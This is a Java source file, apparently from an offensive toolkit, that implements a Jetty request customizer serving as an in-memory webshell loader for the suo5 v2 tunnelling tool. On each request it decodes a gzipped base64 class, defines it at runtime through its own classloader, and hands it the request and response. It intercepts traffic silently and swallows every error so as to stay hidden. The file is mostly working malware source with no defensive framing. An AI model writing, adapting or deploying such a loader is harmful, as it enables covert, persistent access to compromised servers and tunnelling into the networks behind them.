package com.reajason.javaweb.memshell.shelltool.suo5v2;

import org.eclipse.jetty.server.Connector;
import org.eclipse.jetty.server.HttpConfiguration;
import org.eclipse.jetty.server.Request;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Method;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 * @since 2025/12/9
 */
public class Suo5v2JettyCustomizer extends ClassLoader implements HttpConfiguration.Customizer {
    private static Class<?> suo5V2Class;
    private static String suo5V2GZipBase64;

    public Suo5v2JettyCustomizer() {
    }

    protected Suo5v2JettyCustomizer(ClassLoader parent) {
        super(parent);
    }

    // jetty9+
    public void customize(Connector connector, HttpConfiguration channelConfig, Request request) {
        try {
            Object response = invokeMethod(request, "getResponse");
            if (suo5V2Class == null) {
                byte[] bytes = gzipDecompress(decodeBase64(suo5V2GZipBase64));
                suo5V2Class = new Suo5v2JettyCustomizer(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length);
            }
            if (suo5V2Class.newInstance().equals(new Object[]{request, response})) {
                invokeMethod(request, "setHandled", new Class[]{boolean.class}, new Object[]{true});
                return;
            }
        } catch (Throwable ignored) {
        }
    }

    public static Object invokeMethod(Object obj, String methodName) {
        return invokeMethod(obj, methodName, null, null);
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
        try {
            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
            Method method = null;
            while (clazz != null && method == null) {
                try {
                    if (paramClazz == null) {
                        method = clazz.getDeclaredMethod(methodName);
                    } else {
                        method = clazz.getDeclaredMethod(methodName, paramClazz);
                    }
                } catch (NoSuchMethodException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (method == null) {
                throw new NoSuchMethodException("Method not found: " + methodName);
            }
            method.setAccessible(true);
            return method.invoke(obj instanceof Class ? null : obj, param);
        } catch (Exception e) {
            throw new RuntimeException("Error invoking method: " + (obj instanceof Class ? ((Class<?>) obj).getName() : obj.getClass().getName()) + "." + methodName, e);
        }
    }


    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Throwable e) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }
}
